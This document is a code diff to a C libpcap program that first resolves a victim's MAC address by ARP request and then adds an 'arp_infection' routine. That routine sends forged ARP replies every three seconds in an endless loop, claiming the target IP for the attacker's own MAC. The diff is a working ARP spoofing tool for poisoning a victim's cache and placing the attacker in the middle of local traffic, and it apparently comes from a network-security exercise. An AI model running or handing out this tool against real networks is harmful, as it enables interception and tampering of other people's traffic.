@@ -13,7 +13,6 @@
 #include <sys/types.h>
 #include <arpa/inet.h>			/* for inet_addr() */
 #include "net_header.h"			/* Net Header Structure */
-#include <dumpcode.h>
 
 /*
  *  send_arp
@@ -31,7 +30,7 @@ int send_arp(pcap_t *handle, pether_hdr peh, parp_hdr pah, parp_data pad) {
     memcpy(packet, peh, ETHER_SIZE);
     memcpy(packet+ETHER_SIZE, pah, ARP_SIZE);
     memcpy(packet+ETHER_SIZE+ARP_SIZE, pad, ARP_DATA);
-    dumpcode(packet, PACKET_SIZE);
+    
     if(pcap_sendpacket(handle, packet, ETHER_SIZE+ARP_SIZE+ARP_DATA) != 0)
 	return -1;
 
@@ -45,10 +44,9 @@ int send_arp(pcap_t *handle, pether_hdr peh, parp_hdr pah, parp_data pad) {
  *  receive a arp reply packet
  */
 
-void recv_arp(pcap_t *handle) {
+int recv_arp(pcap_t *handle, char* tmac) {
     struct pcap_pkthdr header;        /* The header that pcap gives us */
-    const u_char *packet;                   /* The actual packet */
-    //DWORD offset = 0;
+    const u_char *packet;             /* The actual packet */
 
     while(1) {
 	if(pcap_next_ex(handle, (struct pcap_pkthdr **)&header, &packet) == 1) {
@@ -58,22 +56,23 @@ void recv_arp(pcap_t *handle) {
 		if(((parp_hdr)packet)->ar_op == htons(ARPOP_REPLY)) {
 		    packet += ARP_SIZE;
 
-		    printf("Target MAC Address : %s\n", ether_ntoa(((parp_data)packet)->sender_ha));
-		} else continue;
+		    memcpy(tmac, ether_ntoa((const struct ether_addr*)((parp_data)packet)->sender_ha), ETHER_ADDRSTRLEN); 
+		    break;
+		} else return -1;
 	    }
 	}
     }
 
-    //return 0;
+    return 0;
 }
 
 
 /*
  *  normal_arp
- *  return : X
+ *  return : true(1), false(0)
  *  normal arp request & reply
  */
-void normal_arp(pcap_t *handle, const char* smac, const char* sip, const char* tip) {
+int normal_arp(pcap_t *handle, const char* smac, const char* sip, char* tmac, const char* tip) {
     ether_hdr eh;			/* Ethernet Header */
     arp_hdr ah;				/* ARP Header */
     arp_data ad;			/* ARP Data */
@@ -96,10 +95,46 @@ void normal_arp(pcap_t *handle, const char* smac, const char* sip, const char* t
     memset(&ad.target_ha, 0, ETHER_ADDR_LEN);
     ad.target_ip = inet_addr(tip);
 
-    if(send_arp(handle, &eh, &ah, &ad))
-	printf("Error!");		// will modify
+    send_arp(handle, &eh, &ah, &ad);
+    if(!recv_arp(handle, tmac)) return 1;
 
-    recv_arp(handle);
+    return 0;
+}
+
+
+/*
+ *  arp_infection
+ *  return : true(1), false(0)
+ *  infect arp request
+ */
+void arp_infection(pcap_t *handle, const char* my_mac, const char* tip, const char* smac, const char* sip) {
+    ether_hdr eh;			/* Ethernet Header */
+    arp_hdr ah;				/* ARP Header */
+    arp_data ad;			/* ARP Data */
+
+    /* Setting Ethernet_Header */
+    memcpy(&eh.ether_dhost, ether_aton(smac), ETHER_ADDR_LEN);
+    memcpy(&eh.ether_shost, ether_aton(my_mac), ETHER_ADDR_LEN);
+    eh.ether_type = ntohs(ETHERTYPE_ARP);
+
+    /* Setting ARP_Header */
+    ah.ar_hrd = ntohs(ARPHRD_ETHER);
+    ah.ar_pro = ntohs(ETHERTYPE_IP);
+    ah.ar_hln = ETHER_ADDR_LEN;
+    ah.ar_pln = IP_ADDR_LEN;
+    ah.ar_op = ntohs(ARPOP_REPLY);
+
+    /* Setting ARP_Data */
+    memcpy(&ad.sender_ha, ether_aton(my_mac), ETHER_ADDR_LEN);
+    ad.sender_ip = inet_addr(tip);
+    memcpy(&ad.target_ha, ether_aton(smac), ETHER_ADDR_LEN);
+    ad.target_ip = inet_addr(sip);
+
+    while(1) {
+	printf("Send Infect ARP Reply...\n");
+	send_arp(handle, &eh, &ah, &ad);
+	sleep(3);
+    }
 }
 
 
@@ -110,7 +145,7 @@ void normal_arp(pcap_t *handle, const char* smac, const char* sip, const char* t
  */
 void convrt_mac( const char *data, char *cvrt_str, int sz )
 {
-    char buf[64] = {0, };
+    char buf[ETHER_ADDRSTRLEN] = {0, };
     char t_buf[8];
     char *stp = strtok( (char *)data , ":" );
     int temp=0;
@@ -128,15 +163,16 @@ void convrt_mac( const char *data, char *cvrt_str, int sz )
 
 
 /*
- *  get_sender_MAC
+ *  get_my_MAC
  *  return : true(0), false(-1)
- *  Get sender's MAC Address
+ *  Get My MAC Address
  */
 #define REQ_CNT 20
 
-int get_sender_mac(char* mac_adr)
+int get_my_mac(char* mac_adr, char* ip_adr) 
 {
     int sockfd, cnt, req_cnt = REQ_CNT;
+    struct sockaddr_in *sock;
     struct ifconf ifcnf_s;
     struct ifreq *ifr_s;
     sockfd = socket( PF_INET , SOCK_DGRAM , 0 );
@@ -152,7 +188,7 @@ int get_sender_mac(char* mac_adr)
         return -1;
     }
     
-    if( ifcnf_s.ifc_len > (sizeof(struct ifreq) * req_cnt) ) {
+    if( (DWORD)ifcnf_s.ifc_len > (DWORD)(sizeof(struct ifreq) * req_cnt) ) {
         req_cnt = ifcnf_s.ifc_len;
         ifcnf_s.ifc_buf = realloc( ifcnf_s.ifc_buf, req_cnt );
     }
@@ -166,12 +202,15 @@ int get_sender_mac(char* mac_adr)
         
 	if( ifr_s->ifr_flags & IFF_LOOPBACK )
             continue;
+	sock = (struct sockaddr_in *)&ifr_s->ifr_addr;
+	memcpy(ip_adr, inet_ntoa(sock->sin_addr), INET_ADDRSTRLEN);
         if( ioctl( sockfd, SIOCGIFHWADDR, ifr_s ) < 0 ) {
             perror( "ioctl() - SIOCGIFHWADDR" );
             return -1;
         }
         convrt_mac(ether_ntoa((struct ether_addr *)(ifr_s->ifr_hwaddr.sa_data)), mac_adr, 63);
-	printf("Sender MAC Address : %s\n", mac_adr);
+	printf("My IP Address : %s\n", ip_adr);
+	printf("My MAC Address : %s\n", mac_adr);
     }
 
     free(ifcnf_s.ifc_buf);
@@ -193,7 +232,10 @@ int main(int argc, char *argv[]) {
     char *dev;				/* Interface */
     char *sip;				/* Sender IP */
     char *tip;				/* Target IP */
-    char smac[64] = {0, };		/* Sender MAC */
+    char smac[ETHER_ADDRSTRLEN] = {0, };/* Sender MAC */
+    //char tmac[ETHER_ADDRSTRLEN] = {0, };/* Target MAC */
+    char my_mac[ETHER_ADDRSTRLEN] = {0, };/* My MAC */
+    char my_ip[INET_ADDRSTRLEN] = {0, };/* My IP */
     char errbuf[PCAP_ERRBUF_SIZE];	/* Error String */
 
     if(argc!=4) {
@@ -204,7 +246,7 @@ int main(int argc, char *argv[]) {
     sip = argv[2];
     tip = argv[3];
 
-    get_sender_mac(smac);
+    get_my_mac(my_mac, my_ip);
 
     /* Nonpromiscuous mode */
     handle = pcap_open_live(dev, BUFSIZ, PROMISC, TIME_OUT, errbuf);
@@ -213,8 +255,14 @@ int main(int argc, char *argv[]) {
     	return(2);
     }
 
-    // Get MAC Address
-    normal_arp(handle, smac, sip, tip);
+    // Get Sender's MAC Address
+    if(normal_arp(handle, my_mac, my_ip, smac, sip)) {
+	puts("===== ARP Request Result ====");
+	printf("Sender's MAC Address : %s\n", smac);
+	puts("=============================");
+
+	arp_infection(handle, my_mac, tip, smac, sip);
+    }
 
     /* And close the session */
     pcap_close(handle);
